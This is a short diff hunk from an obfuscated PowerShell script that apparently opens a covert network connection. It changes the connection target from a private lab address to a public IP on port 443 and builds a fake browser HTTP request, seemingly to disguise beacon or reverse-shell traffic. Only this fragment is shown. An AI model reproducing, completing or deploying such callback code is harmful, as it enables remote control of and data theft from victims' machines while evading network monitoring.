@@ -28,8 +28,8 @@ function LEGODOR2
 ($AAA | ForEach { [convert]::ToInt32($_,16) }) -join '.'
 }
 #$p = LEGODOR $px
-$p = "192.168.1.9"
-$AAA = "2222"
+$p = "45.183.247.131"
+$AAA = "443"
 $hh = $AAA
 $w = "GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n"
 $s = [System.Text.ASCIIEncoding]
